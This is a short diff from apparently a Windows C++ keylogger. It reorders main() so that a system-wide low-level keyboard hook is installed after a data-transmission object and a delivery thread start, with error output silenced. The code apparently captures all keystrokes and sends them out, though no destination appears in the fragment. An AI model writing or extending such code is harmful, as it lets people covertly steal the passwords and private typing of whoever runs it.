@@ -429,18 +429,20 @@ int main()
 
 
     //capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
-    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
-    if (hHook == NULL)
-    {
-        //std::cerr << "Keyboard hook failed!" << std::endl;
-        return 1;
-    }
+
 
 
 
     DataTransmission dt = DataTransmission();
 
     std::thread delivery(deliveryThread,std::ref(dt),3);
+
+    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
+    if (hHook == NULL)
+    {
+        //std::cerr << "Keyboard hook failed!" << std::endl;
+        return 1;
+    }
     while (GetMessage(NULL, NULL, 0, 0));
 
 
